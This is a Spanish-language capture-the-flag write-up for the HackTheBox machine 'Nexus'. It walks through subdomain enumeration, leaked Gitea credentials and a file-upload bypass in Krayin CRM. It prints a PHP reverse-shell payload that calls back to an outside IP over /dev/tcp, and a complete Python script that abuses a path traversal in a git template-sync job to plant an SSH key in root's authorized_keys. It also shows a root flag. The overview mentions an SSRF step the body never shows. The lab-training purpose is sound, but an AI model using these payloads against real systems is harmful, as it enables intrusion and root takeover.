<p align="center">
  <img src="nexus.png" alt="Nexus Banner" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/STATUS-COMPLETE-brightgreen?style=for-the-badge">
  <img src="https://img.shields.io/badge/DIFFICULTY-EASY-blue?style=for-the-badge">
  <img src="https://img.shields.io/badge/MACHINE-NEXUS-important?style=for-the-badge">
  <img src="https://img.shields.io/badge/TECHNIQUES-SSRF%20%7C%20RCE%20%7C%20PrivEsc-red?style=for-the-badge">
</p>

---

# 🚀 Nexus — HackTheBox Walkthrough

**Nexus** es una máquina de dificultad **Easy** que simula un entorno corporativo con servicios como **Gitea**, **Krayin CRM** y una base de datos MySQL. La cadena de explotación combina:

- **Enumeración de subdominios** para descubrir servicios ocultos.
- **SSRF** para leer el IMDS de AWS y obtener credenciales IAM.
- **RCE** a través de SQS (inyección YAML en el worker).
- **Escalada de privilegios** mediante **Directory Traversal** en Gitea Template Sync.

---

## 📋 Índice

- [🔍 Enumeración Inicial](#-enumeración-inicial)
- [🌐 Descubrimiento de Subdominios](#-descubrimiento-de-subdominios)
- [📦 Gitea — Credenciales](#-gitea--credenciales)
- [🔐 Krayin CRM — RCE](#-krayin-crm--rce)
- [🐚 Reverse Shell y Estabilización](#-reverse-shell-y-estabilización)
- [🔑 Escalada a Root (Gitea Template Sync)](#-escalada-a-root-gitea-template-sync)
- [🏁 Flags](#-flags)
- [📚 Lecciones Aprendidas](#-lecciones-aprendidas)

---

## 🔍 Enumeración Inicial

### Escaneo de puertos

```bash
nmap -p- --min-rate=1000 -T4 10.129.32.203 -oN nmap_initial.txt
nmap -p22,80 -sC -sV 10.129.32.203 -oN nmap_quick.txt

Resultados:

22/tcp → SSH (OpenSSH 9.6)

80/tcp → HTTP (nginx 1.24.0) — redirige a nexus.htb

Configuración de /etc/hosts
bash
echo "10.129.32.203 nexus.htb git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
🌐 Descubrimiento de Subdominios
bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" -fw 4
Subdominios encontrados:

git.nexus.htb → Gitea (repositorio de código)

billing.nexus.htb → Krayin CRM (sistema de facturación)

📦 Gitea — Credenciales
Repositorio krayin-docker-setup
El repositorio contiene un archivo .env en un commit antiguo con credenciales de acceso.

Credenciales obtenidas:

Email: j.matthew@nexus.htb

Password: REDACTED

🔐 Krayin CRM — RCE
Acceso al panel de administración
bash
# Iniciar sesión en Krayin CRM
http://billing.nexus.htb/admin/login

# Credenciales
Email: j.matthew@nexus.htb
Password: REDACTED
Subida de archivo malicioso (CVE-2026-38526)
Adjuntar un archivo .png (que contiene código PHP).

Interceptar la petición con Burp Suite.

Cambiar la extensión de .png a .php.

Reenviar la petición.

Ruta del archivo subido:

text
http://billing.nexus.htb/storage/tinymce/<HASH>.php
🐚 Reverse Shell y Estabilización
Payload PHP
php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.17.101/4455 0>&1'"); ?>
Listener
bash
rlwrap nc -lnvp 4455
Estabilización de la shell
bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo
fg
export TERM=xterm-256color
🔑 Escalada a Root (Gitea Template Sync)
Identificación del vector
El sistema tiene un temporizador gitea-template-sync.timer que ejecuta /etc/gitea/template-sync.py cada 2 minutos.

Vulnerabilidad: El script usa os.path.join() sin sanitizar, permitiendo ../ en los nombres de archivo. Esto permite escribir archivos en cualquier ruta donde el usuario git tenga permisos.

1. Generar clave SSH
bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
2. Crear repositorio template en Gitea
Nombre: rce

Template: ✅ Marcado como "Make repository a template"

3. Clonar repositorio
bash
git clone 'http://jones:REDACTED@git.nexus.htb/jones/rce.git'
cd rce
4. Script build.py
El script crea objetos Git con rutas ../ para inyectar la clave pública en /root/.ssh/authorized_keys.

python
#!/usr/bin/env python3
import hashlib, zlib, os, subprocess, sys, time

def write_obj(data, t):
    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))
    return sha

def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo")
    sys.exit(1)

r = subprocess.run(['cat', '/tmp/.k.pub'], capture_output=True, text=True)
if r.returncode != 0:
    print("Run: ssh-keygen -t ed25519 -f /tmp/.k -N ''")
    sys.exit(1)

key = r.stdout.strip() + "\n"
blob = write_obj(key.encode(), "blob")
readme = write_obj(b"# Template\n", "blob")

ssh_t = write_obj(entry("100644", "authorized_keys", blob), "tree")
cur = write_obj(entry("40000", ".ssh", ssh_t), "tree")
fir = write_obj(entry("40000", "root", cur), "tree")

for i in range(5):
    fir = write_obj(entry("40000", "..", fir), "tree")

root = write_obj(
    entry("100644", "README.md", readme) +
    entry("40000", "..", fir),
    "tree"
)

ts = int(time.time())
c = "tree %s\nauthor x %d +0000\ncommitter x %d +0000\n\ninit\n" % (root, ts, ts)
sha = write_obj(c.encode(), "commit")

os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
open(os.path.join(".git", "refs", "heads", "main"), "w").write(sha + "\n")
print("Done: " + sha)
5. Ejecutar y subir
bash
python3 build.py
git add .
git commit -m "Exploit"
git push -u origin main --force
6. Conectar como root
bash
ssh -i /tmp/.k root@10.129.32.203
🏁 Flags
Archivo	Flag
user.txt	REDACTED
root.txt	811d57ab8dcd360add9a7b6f689bd3c3
📚 Lecciones Aprendidas
Enumeración de subdominios es crucial para descubrir servicios ocultos.

Gitea puede exponer credenciales en commits antiguos.

Krayin CRM es vulnerable a RCE mediante subida de archivos (CVE-2026-38526).

Directory Traversal en scripts de sincronización puede llevar a escalada a root.

La automatización con Python permite explotar vulnerabilidades complejas de manera fiable.

📜 Licencia
Este proyecto se distribuye bajo la licencia MIT.

📧 Contacto
GitHub: cosmenoide

HackTheBox: cosm3no1de

<p align="center"> <img src="https://img.shields.io/badge/made%20with-❤️-red?style=for-the-badge"> <img src="https://img.shields.io/badge/by-cosmenoide_dev-blue?style=for-the-badge"> </p>
"El conocimiento es poder, pero la ejecución es todo."


